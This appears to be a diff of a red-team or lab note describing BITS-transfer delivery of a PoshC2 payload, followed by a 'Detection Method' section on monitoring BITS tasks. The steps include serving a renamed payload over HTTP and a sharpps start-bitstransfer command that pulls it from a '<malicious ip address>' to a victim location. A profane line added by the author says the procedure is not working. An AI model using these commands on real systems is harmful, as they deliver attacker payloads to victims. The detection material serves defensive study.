@@ -4,8 +4,8 @@
 
 1. In Parrot terminal run the following commands
     ```sh
-    mkdir /home/<user>/Desktop/Lincoler
-    cd /home/<user>/Desktop/Lincoler
+    mkdir /tmp/Lincoler
+    cd /tmp/Lincoler
     cp /var/poshc2/<project name>/payloads/<payload name> Abrodolph.exe
     python3 -m http.server 12137
     ```
@@ -14,7 +14,7 @@
     ```sh
     sharpps start-bitstransfer -source http://<malicious ip address>:12137/Abrodolph.exe -destination <victim save location>
     ```
-
+**SHIT AIN'T FUCKING WORKING GOD DAMMIT**
 ---
 ## Detection Method
 * Monitor for new BITS tasks being created
